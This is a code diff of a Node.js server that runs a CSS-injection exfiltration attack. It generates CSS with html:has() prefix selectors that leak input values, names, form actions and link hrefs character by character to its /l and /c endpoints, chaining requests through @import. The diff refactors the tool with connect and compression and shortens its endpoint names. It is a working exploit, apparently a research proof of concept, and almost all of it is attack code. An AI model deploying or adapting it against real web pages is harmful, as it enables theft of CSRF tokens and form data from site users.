@@ -1,91 +1,97 @@
+const connect = require('connect');
 const http = require('http');
 const url = require('url');
 const port = 5001;
 
 const HOSTNAME = "http://localhost:5001";
 const ELEMENTS = ["input","textarea","form","a"];
-const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"],"a":["href"]};
+const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
 const MAX_ELEMENTS = 20;
 const MAX_VALUE = 50;
-const WAIT_TIME_MS = 250;
+const WAIT_TIME_MS = 500;
 
-const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789 ABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~".split('');
+const HEX = "abcdef0123456789";
+const LOWER_LETTERS = "abcdefghijklmnopqrstuvwxyz";
+const UPPER_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const NUMBERS = "0123456789";
+const SPACE = ' ';
+const SYMBOLS = "!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~";
+const CHARS = (LOWER_LETTERS + NUMBERS + UPPER_LETTERS + SPACE + SYMBOLS).split('');
 
 var stop = false, n = 0, prefixes = {__proto__:null};
 var tokens = [], foundToken = false, currentElementPos = 0;
 
-const requestHandler = (request, response) => {
+const app = connect();
+const compression = require('compression');
+app.use(compression());
+
+app.use('/start', function(request, response){
+    n = 0;
+    tokens = [];
+    prefixes = {__proto__:null};
+    stop = false;                    
+    foundToken = false;
+    currentElementPos = 0;
+    genResponse(response, 0);
+});
+
+app.use('/l', function(request, response){
     let req = url.parse(request.url, url);
-    if (stop) {
-        return response.end();
-    }
-    switch (req.pathname) {
-        case "/start":
-            n = 0;
-            tokens = [];
-            prefixes = {__proto__:null};
-            stop = false;                    
-            foundToken = false;
-            currentElementPos = 0;
-            genResponse(response, 0);
-        break;
-        case "/leak":
-            response.end();
-            for(let element of ELEMENTS) {
-                for(let attribute of ATTRIBUTES[element]) {                 
-                    let elementNumber = +req.query.elementNumber;
-                    if(n === +req.query.n && currentElementPos === elementNumber) {
-                        if(typeof req.query['p_'+element+attribute+elementNumber] !== 'undefined') {
-                            if(typeof prefixes['p_'+element+attribute+elementNumber] === 'undefined') {
-                                prefixes['p_'+element+attribute+elementNumber] = '';
-                            } 
-                            if(req.query['p_'+element+attribute+elementNumber].length > prefixes['p_'+element+attribute+elementNumber].length) {
-                                prefixes['p_'+element+attribute+elementNumber] = req.query['p_'+element+attribute+elementNumber];                            
-                                foundToken = true;
-                            }
-                        }
-                    }                
+    response.end();
+    for(let element of ELEMENTS) {
+        for(let attribute of ATTRIBUTES[element]) {                 
+            let elementNumber = +req.query.e;
+            if(n === +req.query.n && currentElementPos === elementNumber) {
+                if(typeof req.query['p_'+element[0]+attribute[0]+elementNumber] !== 'undefined') {
+                    if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
+                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
+                    } 
+                    if(req.query['p_'+element[0]+attribute[0]+elementNumber].length > prefixes['p_'+element[0]+attribute[0]+elementNumber].length) {
+                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = req.query['p_'+element[0]+attribute[0]+elementNumber];                            
+                        foundToken = true;
+                    }
                 }
-            }         
-        break;
-        case "/next":                             
-            setTimeout(x=>{            
-                if(!foundToken) {
-                    checkCompleted(response);
-                } else {
-                    foundToken =false;                  
-                    n++;
-                    genResponse(response, currentElementPos);                
-                }
-            }, WAIT_TIME_MS);
-        break;
-        case "/collect":   
-            response.end();
-            let attribute = req.query.attribute;
-            let tag = req.query.tag;
-            let value = req.query.value;
-            let tagNumber = +req.query.tagNumber;
-            if(!hasToken({tag, attribute, tagNumber, value})) {
-                tokens.push({tag, attribute, tagNumber, value});
-                foundToken = true;
-            }                  
-        default:
-            response.end();
-    }
-}
+            }                
+        }
+    }         
+});
+
+app.use('/next', function(request, response){
+    setTimeout(x=>{            
+        if(!foundToken) {
+            checkCompleted(response);
+        } else {
+            foundToken =false;                  
+            n++;
+            genResponse(response, currentElementPos);                
+        }
+    }, WAIT_TIME_MS);
+});
+
+app.use('/c', function(request, response){
+    let req = url.parse(request.url, url);
+    response.end();
+    let attribute = req.query.a;
+    let tag = req.query.t;
+    let value = req.query.v;
+    if(!hasToken({tag, attribute, value})) {
+        tokens.push({tag, attribute, value});
+        foundToken = true;
+    }         
+});
 
 const genResponse = (response, elementNumber) => {
     let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
     let properties = [];
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) { 
-            const variablePrefix = '--'+element+'-'+attribute+'-'+elementNumber+'-'+n;  
-            if(typeof prefixes['p_'+element+attribute+elementNumber] === 'undefined') {
-                prefixes['p_'+element+attribute+elementNumber] = '';
+            const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+elementNumber+'-'+n;  
+            if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
+                prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
             }
-            const prefix = prefixes['p_'+element+attribute+elementNumber];
-            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/leak?elementNumber='+(elementNumber)+'&t='+Date.now()+'&n='+n+'&p_'+element+attribute+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');                                            
-            css += 'html:has(['+attribute+'="'+ prefix + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full-token:url(' + HOSTNAME + '/collect?tag='+element+'&attribute='+attribute+'&tagNumber='+elementNumber+'&value=' + encodeURIComponent(prefix) + ');}';                            
+            const prefix = prefixes['p_'+element[0]+attribute[0]+elementNumber];
+            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
+            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -93,9 +99,9 @@ const genResponse = (response, elementNumber) => {
             for(let attribute of ATTRIBUTES[element]) {         
                 for(let i=0;i<MAX_ELEMENTS;i++) { 
                     for(let j=0;j<MAX_VALUE;j++) {         
-                        const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+j;  
+                        const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+i+'-'+j;  
                         properties.push('var('+variablePrefix+'s,none)');              
-                        properties.push('var('+variablePrefix+'full-token,none)');                    
+                        properties.push('var('+variablePrefix+'full,none)');                    
                     }
                 }
             }
@@ -105,16 +111,15 @@ const genResponse = (response, elementNumber) => {
     response.writeHead(200, { 'Content-Type': 'text/css'});
     response.write(css);
     response.end();
-}
+    console.log("CSS Bytes", css.length);
+};
 
-const server = http.createServer(requestHandler)
-
-server.listen(port, (err) => {
+const server = http.createServer(app).listen(port, (err) => {
     if (err) {
         return console.log('[-] Error: something bad happened', err);
     }
     console.log('[+] Server is listening on %d', port);
-})
+});
 
 function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
@@ -124,8 +129,8 @@ function hasToken(newToken) {
     if(!tokens.length) {
         return false;
     }
-    let{tag, attribute, tagNumber, value} = newToken;
-    return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && tagNumber === tokenObject.tagNumber && value === tokenObject.value);
+    let{tag, attribute, value} = newToken;
+    return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && value === tokenObject.value);
 }
 
 function checkCompleted(response) {
